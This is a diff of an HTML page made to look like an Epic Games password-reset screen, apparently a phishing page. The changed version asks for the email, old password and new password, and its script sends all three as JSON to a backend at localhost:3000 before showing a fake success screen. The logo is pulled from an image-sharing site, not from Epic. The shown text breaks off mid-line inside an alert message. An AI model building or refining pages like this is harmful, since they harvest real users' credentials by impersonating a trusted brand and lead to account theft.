@@ -3,52 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Password Reset - Epic Games</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <title>Epic Games Password Reset</title>
+    <link rel="stylesheet" href="epicgames-html-password.css">
+
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
         body {
-            margin: 0;
-            padding: 0;
-            background-color: #181818;
-            font-family: 'Roboto', sans-serif;
-            color: white;
+            background-color: #181818; /* Dark background */
+            color: #fff;
+            font-family: 'Roboto', Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background: url('https://example.com/background-image.jpg') no-repeat center center fixed;
-            background-size: cover;
+            min-height: 100vh;
+            margin: 0;
         }
 
         .container {
-            background-color: rgba(0, 0, 0, 0.8);
+            background-color: #242424;
             padding: 40px;
             border-radius: 12px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
             width: 400px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
             text-align: center;
-            transition: transform 0.4s ease-in-out;
+            margin-bottom: 20px;
         }
 
         .logo img {
-            width: 120px;
+            width: 150px;
+            height: auto;
+        }
+
+        .MuiTypography-root.MuiTypography-body1.mui-o497ds {
+            font-size: 22px;
+            font-weight: 500;
+            text-align: center;
             margin-bottom: 20px;
+            letter-spacing: 0.5px;
+            color: #f5f5f5;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             position: relative;
+            width: 100%;
         }
 
-        input[type="email"],
-        input[type="password"] {
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ddd;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        input[type="email"], input[type="password"] {
             width: 100%;
-            padding: 10px;
+            padding: 8px;
             border: 1px solid #444;
             border-radius: 6px;
             background-color: #333;
             color: #fff;
             font-size: 14px;
+            font-weight: bold;
             outline: none;
         }
 
@@ -57,80 +81,111 @@
             box-shadow: 0 0 5px #007bff;
         }
 
-        button {
-            background: linear-gradient(90deg, #007bff, #0056b3);
-            color: #fff;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 14px;
-            width: 100%;
-            margin-top: 20px;
-        }
-
-        button:hover {
-            background: linear-gradient(90deg, #0056b3, #007bff);
-        }
-
         .requirements {
             margin-top: 15px;
-            padding: 15px;
-            background-color: #222;
+            border: 1px solid #444;
             border-radius: 6px;
+            padding: 15px;
+            background-color: #2a2a2a;
+            font-size: 14px;
         }
 
         .requirements ul {
             margin: 0;
-            padding: 0;
-            list-style: none;
-            color: #bbb;
+            padding: 0 0 0 20px;
+            list-style: disc;
         }
 
         .requirements li {
             margin-bottom: 10px;
+            color: #bbb;
         }
 
-        .success-message {
-            display: none;
-            background-color: #28a745;
-            color: white;
+        button {
+            background: linear-gradient(90deg, #007bff, #0056b3);
+            color: #fff;
+            border: none;
             padding: 10px;
             border-radius: 6px;
-            margin-top: 20px;
+            cursor: pointer;
             font-weight: bold;
+            width: 100%;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        button:active {
+            transform: translateY(1px);
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .transition-wrapper {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        .transition-wrapper.active {
+            display: flex;
+        }
+
+        .transition-wrapper img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        .transition-wrapper h2 {
+            font-size: 24px;
+            color: #fff;
         }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Logo Section -->
         <div class="logo">
             <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
         </div>
 
+        <!-- Instructions -->
         <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
-            Enter your email and new password to reset your Epic Games account password.
+            Enter your new password for your Epic Games account.
         </div>
 
-        <form id="password-reset-form">method="POST" action="http://localhost:3000/reset-password">
+        <!-- Form Section -->
+        <form id="password-reset-form">
+            <!-- Email Section -->
             <div class="form-group">
                 <label for="email">Email</label>
                 <input type="email" id="email" name="email" placeholder="Enter your email" required>
             </div>
 
+            <!-- Old Password Section -->
             <div class="form-group">
                 <label for="oldPassword">Old Password</label>
                 <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
             </div>
 
+            <!-- New Password Section -->
             <div class="form-group">
                 <label for="newPassword">New Password</label>
                 <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
             </div>
 
+            <!-- Password Requirements -->
             <div class="requirements">
                 <strong>Password Requirements:</strong>
                 <ul>
+                    <li>Must not use any of your last 5 passwords</li>
                     <li>Must contain at least 7 characters</li>
                     <li>Must include at least 1 letter</li>
                     <li>Must include at least 1 number</li>
@@ -138,25 +193,45 @@
                 </ul>
             </div>
 
-            <button type="submit">Reset Password</button>
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn">Reset Password</button>
         </form>
+    </div>
 
-        <div id="success-message" class="success-message">
-            Password reset successfully!
-        </div>
+    <!-- Success Transition -->
+    <div class="transition-wrapper" id="transitionWrapper">
+        <img src="https://media.giphy.com/media/vFKqnCdLPNOKc/giphy.gif" alt="Success" />
+        <h2>Password Reset Successful</h2>
     </div>
 
     <script>
-        document.getElementById("password-reset-form").addEventListener("submit", function (e) {
-            e.preventDefault();
-            // Show loading spinner or transition
-            document.getElementById("success-message").style.display = "block";
+        // Handle form submission
+        document.getElementById('password-reset-form').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-            // Simulate form submission (add your backend logic here)
-            setTimeout(function () {
-                document.getElementById("success-message").innerText = "Password reset successful!";
-            }, 2000);
-        });
-    </script>
-</body>
-</html>
+            // Show loading animation
+            const transitionWrapper = document.getElementById('transitionWrapper');
+            transitionWrapper.classList.add('active');
+
+            const formData = new FormData(this);
+            const email = formData.get('email');
+            const oldPassword = formData.get('oldPassword');
+            const newPassword = formData.get('newPassword');
+
+            // Send the data to the backend
+            fetch('http://localhost:3000/reset-password', {
+                method: 'POST',
+                body: JSON.stringify({ email, oldPassword, newPassword }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // If successful, show the success screen
+                    setTimeout(() => {
+                        window.location.reload(); // Reload the page
+                    }, 3000); // Keep the success message for 3 seconds
+                } else {
+                    alert('Password reset failed:
